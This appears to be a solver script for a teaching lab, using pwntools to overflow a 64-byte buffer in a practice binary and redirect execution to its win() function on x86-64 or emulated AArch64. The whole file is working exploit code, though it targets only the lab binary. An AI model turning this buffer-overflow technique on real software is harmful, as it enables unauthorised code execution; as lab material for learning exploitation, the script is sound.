#!/usr/bin/env python3
"""ch02-lab/solve.py — end-to-end proof the lab works.

Overflows hello_overflow's 64-byte buffer to redirect execution into win()
and checks for the success token. It locates the saved-return offset by a
short bounded search, so it is independent of compiler padding and works on
x86-64 and (via qemu-user) AArch64.

Usage:  ./solve.py [amd64|aarch64]
"""
import sys
from pwn import *

arch = sys.argv[1] if len(sys.argv) > 1 else 'amd64'
path = {'amd64': './hello_overflow',
        'aarch64': './hello_overflow_arm64'}[arch]

context.binary = exe = ELF(path, checksec=False)   # sets arch/bits/endian
context.log_level = 'warn'

def launch():                                       # native or emulated
    if arch == 'aarch64':
        return process(['qemu-aarch64-static', exe.path])
    return process(exe.path)

def try_offset(off):
    io = launch()
    io.sendafter(b'name?', fit({off: exe.sym['win']}))   # pad then win()
    data = io.recvall(timeout=2)
    io.close()
    return b'CH02_LAB_OK' in data

def main():
    for off in range(64, 129, context.bytes):      # try 64,72,...,128
        if try_offset(off):
            log.success(f'{arch}: control at offset {off} -> win() reached')
            return 0
    log.failure(f'{arch}: no offset in range reached win()')
    return 1

if __name__ == '__main__':
    sys.exit(main())
